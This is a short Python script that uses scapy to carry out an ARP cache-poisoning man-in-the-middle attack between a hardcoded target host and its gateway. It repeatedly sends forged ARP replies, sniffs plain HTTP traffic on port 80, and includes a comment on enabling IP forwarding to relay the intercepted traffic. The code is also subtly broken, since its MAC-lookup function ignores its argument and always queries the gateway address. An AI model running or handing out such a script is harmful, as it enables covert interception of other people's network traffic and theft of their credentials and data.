from scapy.all import *
import time
import threading
conf.verb = 0
def arp_sniff(pkt):
    print(pkt.summary())
def poisen_arp(target_ip,target_mac,gateway_ip,gateway_mac):
    print("[+] Start Poisening.....")
    while True:
        send(ARP(op=2,psrc=gateway_ip,pdst=target_ip,hwdst=target_mac,))   # Generate ARP Replay on DST ---> GatewayIP GatewayMAC
        send(ARP(op=2,psrc=target_ip,pdst=gateway_ip,hwdst=gateway_mac))
        time.sleep(2)
def get_mac(ip):
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="10.21.143.232")
    ans,unasn = srp(pkt,timeout=2,retry=10)   # srp function for sen packet in 2 layer
    return ans[0][1][Ether].src
target_ip = '10.21.143.207'
gateway_ip = '10.21.143.232'
target_mac = get_mac(target_ip)
gateway_mac = get_mac(gateway_ip)
print('[+] TargetMac ',target_mac)
print('[+] Gateway MAC ',gateway_mac)
t = threading.Thread(target=poisen_arp,args=(target_ip,target_mac,gateway_ip,gateway_mac,))
t.start()
# echo 1 > /proc/sys/net/ipv4/ip_forward ----->  Enable Routung
sniff(filter="tcp port 80",prn=arp_sniff)
while True:
    time.sleep(1)
# OP ---> Opcode = req OR Replay
# Opcode 1 ---> Request
#Opcode 2 ---> Replay
# hwsrc= ---> this is method is empty becase we can src mac is equal my srcmac
